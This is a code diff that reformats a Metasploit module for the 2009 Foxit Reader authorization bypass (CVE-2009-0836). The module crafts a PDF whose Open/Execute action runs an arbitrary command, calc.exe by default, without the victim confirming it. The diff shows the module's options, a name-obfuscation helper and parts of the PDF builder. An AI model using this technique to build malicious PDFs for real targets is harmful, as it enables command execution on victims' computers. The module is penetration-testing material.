@@ -9,30 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Foxit Reader Authorization Bypass',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Foxit Reader Authorization Bypass',
+        'Description' => %q{
           This module exploits an authorization bypass vulnerability in Foxit Reader
-        build 1120. When an attacker creates a specially crafted pdf file containing
-        an Open/Execute action, arbitrary commands can be executed without confirmation
-        from the victim.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
-      'References'     =>
-        [
+          build 1120. When an attacker creates a specially crafted pdf file containing
+          an Open/Execute action, arbitrary commands can be executed without confirmation
+          from the victim.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
+        'References' => [
           [ 'CVE', '2009-0836' ],
           [ 'OSVDB', '55615'],
           [ 'BID', '34035' ],
         ],
-      'DisclosureDate' => '2009-03-09'))
+        'DisclosureDate' => '2009-03-09'
+      )
+    )
 
     register_options(
       [
-        OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
-        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf'])
-      ])
-
+        OptString.new('CMD', [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
+        OptString.new('FILENAME', [ false, 'The file name.', 'msf.pdf'])
+      ]
+    )
   end
 
   def run
@@ -46,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     file_create(pdf)
   end
 
-  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
+  # http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
   def n_obfu(str)
     result = ""
     str.scan(/./u) do |c|
@@ -76,7 +79,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_pdf(exec)
-
     xref = []
     eol = "\x0d\x0a"
     endobj = "endobj" << eol
@@ -107,6 +109,5 @@ class MetasploitModule < Msf::Auxiliary
     pdf << "startxref" << eol
     pdf << xrefPosition.to_s() << eol
     pdf << "%%EOF" << eol
-
   end
 end
